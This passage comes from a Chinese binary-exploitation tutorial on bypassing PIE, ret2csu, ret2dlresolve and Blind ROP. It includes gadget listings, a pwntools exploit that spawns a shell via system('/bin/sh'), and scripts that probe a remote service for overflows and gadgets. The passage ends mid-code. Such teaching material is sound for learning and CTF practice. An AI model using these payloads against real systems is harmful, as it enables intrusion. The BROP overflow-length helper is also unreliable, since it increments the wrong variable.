<h2 id="0x84-Bypass-PIE"><a href="#0x84-Bypass-PIE" class="headerlink" title="0x84 Bypass PIE"></a>0x84 Bypass PIE</h2><p>最麻烦的保护措施，通过将代码段，数据段，全局变量段等进行地址随机化，使得常用的ROP技术失效（制作ROP链需要知道Gadgets的地址）。程序中每一条指令的地址都作为一个偏移，在程序执行的过程中指令的真实地址就是程序运行时的基地址加上该指令偏移地址就可以得到真实地址。由于每次程序执行代码地址都会变，因此不方便下断点调试，可以在gdb中先用vmmap查看程序基地址，再加上偏移地址就可以得到真实地址。</p>
<ol>
<li><p>partial write</p>
<p> 最常用的绕过方式，开启了PIE后虽然基地址每次都会改变，但是低12位(3个十六进制数)是不变的，因此通过改写后12位地址就控制一部分范围的偏移跳转，若目标地址刚好位于修改第12位就可以跳转的范围内，就可以通过partial write绕过PIE</p>
</li>
<li><p>泄漏地址</p>
<p>开启PIE的程序每条指令都采用相对偏移地址，很类似0x7节中libc函数的情况 ，每条指令的偏移是可以事先得知的，因此只要能够在程序运行的过程中泄漏出任何一个指令的真实地址，那么就可以计算出程序的基地址，这样其他指令的地址就可以得知了，类似0x7节中泄漏libc基地址计算system的地址。</p>
</li>
<li><p>vsyscall</p>
<p> 为了加快程序执行系统调用的速度，部分linux内核将部分无参数的系统调用从内核空间映射到用户空间里，这些被映射的系统调用被称为vsyscall。程序就算开启了PIE，但是vsyscall的地址是不变的，所以vsyscall中调用syscall指令的地址也是一直不变的，这样我们就有了一个<code>syscall</code>的gadget。需要注意的是直接rop跳到vsyscall里的<code>syscall</code>会段错误，因为vsyscall会检查是否是从该系统调用的开头开始执行的（例如syscall的地址是0xffffffffff600007，而该系统调用函数的开头是0xffffffffff600000，所以我们只能先跳转到0xffffffffff600000）。此外，现在的部分操作系统已经删除了vsyscall功能。</p>
</li>
<li><p>vdso</p>
<p> vdso是为了取代vsyscall而存在的，功能和vsyscall一样，由glibc提供，因此vdso中的地址是随机化的，不过好处是vdso中的任意一条指令都可以执行，不像vsyscall还会检查是否是从开头执行。那么如果要利用vdso，就需要爆破出vdso中的指令地址，在64位下vdso的地址随机化达到22位，而32位仅有16位（一个字节）是随机的，比较容易爆破，</p>
</li>
</ol>
<h2 id="0x85-ret2csu"><a href="#0x85-ret2csu" class="headerlink" title="0x85 ret2csu"></a>0x85 ret2csu</h2><p>此攻击方式是<a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR.pdf">BlackHat2018</a>中提出来的，可以看做是rop的万金油，其作用就是在<strong>x64系统</strong>下利用__libc_csu_init函数中提供的通用Gadgets来实现调用任意参数小于等于3个的函数。__libc_csu_init位于程序中，其作用就是初始化libc，所以此攻击的前提就是程序需要调用libc。在__libc_csu_init中一共有两段可用的Gadgets，如下所示（这里提供的示例来自CTF Wiki，不同的libc版本该函数的内容可能不太一样，但是总体上是差不多的）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">; Second Gadgets.</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">; First Gadgets.</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br></pre></td></tr></table></figure>



<p>第一段Gadgets从0x40061A开始（即pop rbx）可以利用栈上的值控制寄存器rbx，rbp，r12，r13，r14，r15，第二段Gadgets从0x400600开始（即mov rdx, r13），可以通过r13，r14与r15控制函数的前三个参数rdx，rsi与rdi（只能控制低32位4个字节，高32位为0），而之后紧接着就有一个call，通过r12与rbx就可以构造出目标函数的地址。call指令结束以后后面三条指令的目的就是需要满足rbp==rbx+1，如果满足该关系式程序逻辑就不会进行跳转，而是继续执行后面的指令。</p>
<p>攻击前提：</p>
<ol>
<li>64位程序</li>
<li>使用了libc</li>
<li>没有开启PIE</li>
</ol>
<p>由于可控制的函数的第一个参数只能控制4个字节，因此system函数这一类的就用不了，但是可以利用read或者write函数读写地址。利用的exp如下（不同版本可能寄存器不太一样）。其中gadgets1和gadgets2对应的就是上面的First gadgets和Second gadgets。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2csu</span>(<span class="params">gadgets1, gadgets2, func_addr, arg0, arg1, arg2</span>):</span></span><br><span class="line">    rbx, rbp = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    r12 = func_addr</span><br><span class="line">    r13 = arg2  <span class="comment"># rdx</span></span><br><span class="line">    r14 = arg1  <span class="comment"># rsi</span></span><br><span class="line">    r15 = arg0  <span class="comment"># rdi, only low 32bits available.</span></span><br><span class="line">    <span class="keyword">return</span> p64(gadgets1) + \</span><br><span class="line">		p64(rbx) + p64(rbp) + \</span><br><span class="line">    	p64(r12) + p64(r13) + \</span><br><span class="line">        p64(r14) + p64(r15) + \</span><br><span class="line">        p64(gadgets2)</span><br><span class="line"></span><br><span class="line">conn.send(junkdata + ret2csu(...))</span><br></pre></td></tr></table></figure>



<h2 id="0x86-ret2dlresolve"><a href="#0x86-ret2dlresolve" class="headerlink" title="0x86 ret2dlresolve"></a>0x86 ret2dlresolve</h2><p>在0x7节中libc中提到过plt表的第一项就是跳转到_dl_runtime_resolve函数，该函数的作用就是动态将libc中的函数地址写入got表中，并且执行被解析到函数。_dl_runtime_resolve函数原型为<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code>，假如可以控制这两个参数，就可以控制_dl_runtime_resolve解析并执行我们想要的函数。</p>
<p>plt表与got表的部分结构如下所示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">plt[0]:</span><br><span class="line">	push got[1]</span><br><span class="line">	jmp got[2]</span><br><span class="line">func@plt:</span><br><span class="line">	jmp func@got</span><br><span class="line">	push func_index</span><br><span class="line">	jmp plt[0]</span><br><span class="line"></span><br><span class="line">got[0] ---&gt; .dynamic address</span><br><span class="line">got[1] ---&gt; link_map_object address</span><br><span class="line">got[2] ---&gt; _dl_runtime_resolve address</span><br></pre></td></tr></table></figure>



<p>通过上表可以看到_dl_runtime_resolve函数的两个参数link_map_obj与对应的函数reloc_index分别在func@plt与plt[0]中被push到栈中，而jmp到got[2]以后直接调用_dl_runtime_resolve函数，执行顺序的行数为5，6，7，2，3，11。</p>
<p>在_dl_runtime_resolve调用的时候，会做如下几件事，而这几件事对后续的ret2dlresolve利用非常重要。</p>
<ol>
<li>首先通过link_map_object访问.dynamic段（link_map_object保存了.dynamic地址），分别取出.dynstr，.dynsym和.rel.plt的地址，其中.dynstr为动态链接字符串表，包含了动态链接时所需要的所有字符串（包括函数名），.dynsym是动态链接符号表，类似符号表，里面保存了和动态链接相关的所有符号，.rel.plt是动态链接代码重定位段，包含了需要重定位的函数信息，包括函数偏移，在符号表中的索引等。</li>
<li>在取出这三个地址以后，先通过.rel.plt地址+reloc_index就可以计算出要被动态链接的函数的重定位表指针rel</li>
<li>然后通过<code>rel-&gt;r_info&gt;&gt;8</code>就可以计算出在.dynsym动态链接符号表中的下标</li>
<li>根据.dynsym的地址+下标偏移就可以拿到对应符号表项的指针sym</li>
<li>之后通过.dynstr地址+<code>sym-&gt;st_name</code>就可以取出符号名字符串的指针，也就是函数名指针</li>
<li>然后在动态链接库中查找这个函数的地址，并把地址写入<code>*(rel-&gt;r_offset)</code>，也就是该函数对应的got表项</li>
<li>最后调用这个函数</li>
</ol>
<p>其中.dynamic段的结构是一个数组，数组每一项的结构如下所示，其实根据d_tag的值就可以很容易在.dynamic中找到对应项地址，.dynstr，.dynsym和.rel.plt对应的tag值为5，6，17。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Legal values for d_tag (dynamic entry type).  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_NULL   0   <span class="comment">/* Marks end of dynamic section */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_NEEDED 1   <span class="comment">/* Name of needed library */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PLTRELSZ 2   <span class="comment">/* Size in bytes of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PLTGOT 3   <span class="comment">/* Processor defined value */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_HASH   4   <span class="comment">/* Address of symbol hash table */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_STRTAB 5   <span class="comment">/* Address of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SYMTAB 6   <span class="comment">/* Address of symbol table */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELA   7   <span class="comment">/* Address of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELASZ 8   <span class="comment">/* Total size of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELAENT  9   <span class="comment">/* Size of one Rela reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_STRSZ  10    <span class="comment">/* Size of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SYMENT 11    <span class="comment">/* Size of one symbol table entry */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_INIT   12    <span class="comment">/* Address of init function */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_FINI   13    <span class="comment">/* Address of termination function */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SONAME 14    <span class="comment">/* Name of shared object */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RPATH  15    <span class="comment">/* Library search path (deprecated) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_SYMBOLIC 16    <span class="comment">/* Start symbol search here */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_REL    17    <span class="comment">/* Address of Rel relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELSZ  18    <span class="comment">/* Total size of Rel relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_RELENT 19    <span class="comment">/* Size of one Rel reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DT_PLTREL 20    <span class="comment">/* Type of reloc in PLT */</span></span></span><br></pre></td></tr></table></figure>



<p>.dynsym是一个数组，数组的每一项sym的结构如下所示。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name;   <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr    st_value;  <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word    st_size;   <span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;   <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;  <span class="comment">/* Symbol visibility under glibc&gt;=2.2 */</span></span><br><span class="line">  Elf32_Section st_shndx;  <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Word        st_name;                <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        st_info;                <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;                <span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf64_Section        st_shndx;                <span class="comment">/* Section index */</span></span><br><span class="line">  Elf64_Addr        st_value;                <span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf64_Xword        st_size;                <span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br></pre></td></tr></table></figure>



<p>.rel.plt也是一个数组，数组的每一项rel的结构如下所示</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr        r_offset;</span><br><span class="line">    Elf32_Word       r_info;</span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Addr        r_offset;                <span class="comment">/* Address */</span></span><br><span class="line">  Elf64_Xword        r_info;                        <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">  Elf64_Sxword        r_addend;                <span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf64_Rela;</span><br><span class="line"><span class="comment">/* How to extract and insert information held in the r_info field.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_SYM(i)                        ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_TYPE(i)                        ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span><br></pre></td></tr></table></figure>



<p>攻击方法：</p>
<ol>
<li><p>程序没有开启RELRO</p>
<p> 那么我们可以任意修改.dynamic段（数组）里的内容。首先在一块可控的内存区域内伪造一个字符串表，将func字符串（func可以为libc中的任意目标函数，例如read，puts等）替换为system字符串，之后修改.dynamic里的字符串表地址（.dynstr，该地址很容易通过tag查到）为我们伪造的字符串表地址，最后通过栈溢出修改ret为func@plt的第二条指令的地址，也就是<code>push func_index</code>，这样就会为func调用一次_dl_runtime_resolve，这样根据符号名解析到的就是system函数，最后会执行system函数。</p>
</li>
<li><p>开启了Partial RELRO</p>
<p> 这时就不可以修改.dynamic中的值了，但是可以通过伪造.rel.plt表实现。虽然从.dynamic中取出的.rel.plt地址我们不可以控制，但是reloc_index是在栈中，因此可以被我们控制，所以通过.rel.plt地址+reloc_index我们就可以控制重定位表指针rel的值，精心构造的reloc_index可以让rel指向我们伪造的一个重定位表项，这时<code>rel-&gt;r_info</code>我们也可以控制，就可以控制.dynsym动态链接符号表中的下标。同样类似控制rel，虽然从.dynamic中取出的.dynsym地址不可以控制，但是下标是可以控制的，因此我们也可以控制.dynsym的地址+下标偏移得到对应符号表项的指针sym，可以使sym指向我们伪造的一个sym表项，在伪造的sym表项中我们可以控制<code>sym-&gt;st_name</code>，这样我们就可以控制.dynstr地址+<code>sym-&gt;st_name</code>所指向的的符号名为我们控制的字符串，例如system，同样调用_dl_runtime_resolve的时候可以执行system，最后需要注意的是<code>rel-&gt;r_offset</code>指向的地址需要可写。综上所述，具体利用步骤如下。</p>
<ol>
<li><p>计算reloc_index。通过<code>objdump -s -j .rel.plt ./pwn</code>获取.rel.plt在程序中的偏移offset，因此<code>reloc_index = fake_rel_plt_addr - offset</code></p>
</li>
<li><p>找一个可控内存伪造rel表项，其中r_offset需要可写</p>
</li>
<li><p>计算rel表项中的r_info。通过<code>objdump -s -j .dynsym ./pwn</code>获取.dynsym在程序中的偏移offset，因此<code>r_info = ((fake_dynsym_addr - offset) / 0x10)&lt;&lt;8 + 0x7</code></p>
</li>
<li><p>找一个可控内存伪造sym表项。表项中其他值都不重要，重要的是st_name的值。</p>
</li>
<li><p>计算sym中的st_name。通过<code>objdump -s -j .dynstr ./pwn</code>获取.dynstr在程序中的偏移offset，因此<code>st_name = fake_dynstr_addr - offset</code></p>
</li>
<li><p>找一个可控内存fake_dynstr_addr写入想要解析的符号字符串，例如system</p>
</li>
<li><p>至此rel表项，sym表项和符号都伪造完成，也计算出了reloc_index，所以直接将reloc_index放在栈顶，然后跳转到plt表项中直接<code>jmp plt[0]</code>的地址即可。</p>
</li>
<li><p>若栈上的值实在不好控制，则可以通过栈迁移将栈转移到bss段在进行操作，需要注意内存对齐的情况。</p>
</li>
<li><p>由于上述手工步骤过于复杂，而且有很多重复操作的步骤，也容易出错，因此pwntools中集成了关于ret2dlreslove的利用方法，下面的示例来自ctf-wiki。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./main_partial_relro_32&quot;</span>)</span><br><span class="line"></span><br><span class="line">rop = ROP(context.binary)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwntools will help us choose a proper addr</span></span><br><span class="line"><span class="comment"># https://github.com/Gallopsled/pwntools/blob/5db149adc2/pwnlib/rop/ret2dlresolve.py#L237</span></span><br><span class="line">rop.read(<span class="number">0</span>, dlresolve.data_addr)</span><br><span class="line"></span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">112</span> + rop.chain() + <span class="string">&#x27;a&#x27;</span> * <span class="number">256</span> + dlresolve.payload</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./main_partial_relro_32&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>开启了Full RELRO</p>
<p> 这种情况下程序中使用的动态链接的函数在程序开始执行之前就被解析完毕，_dl_runtime_reslove和got表也就用不到了，而且.dynamic和got表都不可写，无法利用。</p>
</li>
</ol>
<h2 id="0x88-BROP"><a href="#0x88-BROP" class="headerlink" title="0x88 BROP"></a>0x88 BROP</h2><p>BROP就是Blind ROP，也就是ROP盲打，指在没有程序可执行文件的情况下利用ROP进行盲打。</p>
<p>攻击前提：</p>
<ol>
<li>必须存在栈溢出可以覆盖ret地址劫持控制流</li>
<li>程序崩溃后可以自动重启，并且重启后地址不变（例如nginx，mysql，apache，openssh等服务器）</li>
</ol>
<p>攻击步骤：</p>
<ol>
<li><p>获取栈溢出长度</p>
<p> 非常简单，通过枚举即可，每次增加一个字节直到程序报错</p>
</li>
<li><p>绕过canary</p>
<p> 通过逐字节爆破canary，主要用了 0x82节中的爆破方法获取到canary</p>
</li>
<li><p>rop</p>
<p> 找到canary以后我们就可以控制ret了，这时候就需要找到合适的garget来形成rop链。</p>
</li>
</ol>
<p>由于我们不知道程序里的代码，所以想直接找到一个syscall几乎是不可能的，因此首要任务就是先想办法可以打印出程序的内存，使我们可以获取更多的信息，这是我们的目标。即然需要打印程序，那么就需要函数调用/系统调用，首先就需要找到可以控制寄存器的gadgets。通过0x85节我们可以知道在csu中有一段通用的gadgets，如下所示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br></pre></td></tr></table></figure>



<p>但是我们想控制的是rdi，rsi和rdx这三个寄存器（这三个寄存器中保存函数参数），但是从csu的gadget中，如果从0x400621（0x40061A+7）处开始，这一段gadget就变成了<code>pop rsi; pop r15; ret</code>，如果从0x400623（0x40061A+9）处开始，这一段gadget就变成了<code>pop rdi; ret</code>，这样我们就有了两个已知的可以控制rdi和rsi的gadgets，但是gadgets的具体位置，我们还是一无所知，只能通过猜测+测试的方法获取gadgets。</p>
<p>首先我们将程序的gadgets分为3类：stop gadgets，trap gadgets和probe gadgets。Probe gadgets就是我们猜测并且需要测试的gadgets，对于64位程序，可以直接从0x400000开始尝试，如果不成功则程序可能开启了PIE，或者这是32位的程序。Stop gadgets是一段不会使程序立即崩溃的gadgets，也就是说程序控制流跳转到stop gadgets以后还可以正常运行一段时间，之后可能会发生崩溃。Trap gadgets则是一段可以立即使程序崩溃的gadgets，其实trap gadgets可以不是一段gadgets，甚至可以是一个非法地址，只要程序跳转到trap以后可以立即崩溃就行。最后，通过stop和trap在栈上的不同布局，我们就可以测试我们猜测的prob是否是一段正确的gadgets（其实原理上类似SQL注入的时间盲注），有如下几个例子。</p>
<ol>
<li><p>测试不会对栈进行操作的gadgets，例如<code>ret</code>，<code>xor eax, eax; ret</code>等，若没有进行pop或push，则会直接跳转到stop，程序不会立即崩溃，否则就会跳转到trap，程序会立即崩溃，后续几个例子的原理相同。</p>
<p> buf | canary | probe | stop | trap | trap | … |</p>
</li>
<li><p>测试只pop一次的gadgets。</p>
<p> buf | canary | probe | trap | stop | trap | trap | … |</p>
</li>
<li><p>测试pop了两次的gadgets，可以依此类推寻找pop多次的gadgets</p>
<p> buf | canary | probe | trap | trap | stop | trap | trap | .. |</p>
</li>
<li><p>测试probe是不是一个stop gadgets，若probe是一个stop gadgets，则程序不会立即崩溃，否则就会立即崩溃</p>
<p> buf | canary | probe | trap | trap | … |</p>
</li>
<li><p>找到到csu中那连续6个pop的gadgets（非常重要，找到这个gadgets就相当于可以控制很多寄存器）</p>
<p> buf | canary | probe | trap | trap | trap | trap | trap | trap | stop | trap | trap | … |</p>
</li>
</ol>
<p>关于识别plt表，plt相对比较稳定，跳转到plt以后程序一般不会崩溃。plt表的每一项都是16字节长，所以若连续16次测试probe的时候程序都没有崩溃（例如从0x400000开始尝试，尝试到0x400010，这些probe都是gadgets），那么很可能遇到了plt表。此外，plt中的一项包含了3条指令<code>jmp func@got; push func_index; jmp plt[0]</code>，第一条指令jmp长6字节，第二条指令push长5字节，最后一个jmp指令长5字节，因此可以通过前后偏移6字节来确定哪一个probe是plt表项的中间（即是处于push还是处于第一个jmp）。</p>
<p>此时虽然我们找到了plt表，但是还不能确定哪一个是输出函数（例如puts），我们最终的目标是调用输出函数打印程序内存。例如寻找puts函数，我们只需要控制rdi即可（puts只接受一个参数），那么我们可以依次遍历每一个plt表项，每次遍历的step为16字节，之后我们控制rdi为程序的开头也就是0x400000（未开启PIE），ELF开头的4个字节一般为<code>\x7fELF</code>，所以如果某一个plt表项调用完以后发现程序输出了这4个字节，那么那就是puts的plt表项，找到了puts的地址以后我们就可以随心所欲输出程序地址的内存了，甚至可以把代码段全打印出来供我们离线寻找更多的gadgets。</p>
<p>综上所述，brop的一般过程如下所述。首先确定溢出长度，exp如下，注意，若遇到了canary则该函数返回的仅为buf长度，若没有canary（比较少见），则该函数返回的包括了old ebp的长度。其中<code>get_remote_conn</code>函数可以获取一个remote conn，<code>conn_send_recv</code>函数负责发送和接收data。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_overflow_length</span>():</span></span><br><span class="line">    length = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = get_remote_conn()</span><br><span class="line">            output = conn_send_recv(conn, <span class="string">&#x27;a&#x27;</span> * length)</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="comment"># OK means remote not crash.</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;OK&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># Crash and output something else.</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">	<span class="keyword">return</span> length - <span class="number">1</span></span><br></pre></td></tr></table></figure>



<p>之后需要寻找stop gadgets，exp如下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_stop_gadget</span>(<span class="params">buf_length, canary=None</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * buf_length  <span class="comment"># buf</span></span><br><span class="line">    <span class="keyword">if</span> canary:</span><br><span 